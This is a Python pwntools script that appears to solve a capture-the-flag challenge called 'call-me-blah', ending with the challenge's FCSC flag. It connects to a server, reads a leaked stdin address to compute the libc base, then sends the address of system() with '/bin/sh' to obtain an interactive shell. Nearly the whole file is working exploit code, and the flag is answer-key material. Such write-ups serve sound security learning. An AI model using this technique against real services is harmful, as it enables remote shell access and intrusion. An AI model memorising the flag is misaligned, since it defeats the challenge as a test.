from pwn import *

# Defines the different binary given
callmeblah = context.binary = ELF("./call-me-blah")
libc = ELF("./libc-2.36.so")
ld = ELF("./ld-2.36.so")

# Connects to the serveur
HOST, PORT = "127.0.0.1", 4000
r = remote(HOST, PORT)

# Gets the leaked address of stdin given by the server
leaked_address = r.recv().decode()
leaked_address = int(leaked_address[2:], 16)
print(f"Leaked address: {leaked_address}")

# Gets the official stdin address in the library
stdin_address = libc.sym["_IO_2_1_stdin_"]
print(f"Official stdin address: {stdin_address}")

# Sets the base address with the offset we found
libc.address = (leaked_address - stdin_address)

# Gets the address of the system function
system_address = libc.sym["system"]
print(f"System address using libc.address: {system_address}")

# Sends the address of the system funtion and the /bin/sh argument and switch to interactive mode
r.sendline(str(system_address).encode())
r.sendline("/bin/sh".encode())
r.interactive()

# FCSC{c22407092c870dfb9b6ee7e5277015de9c2a6fbc16a251237c037e73eb7a3a7e}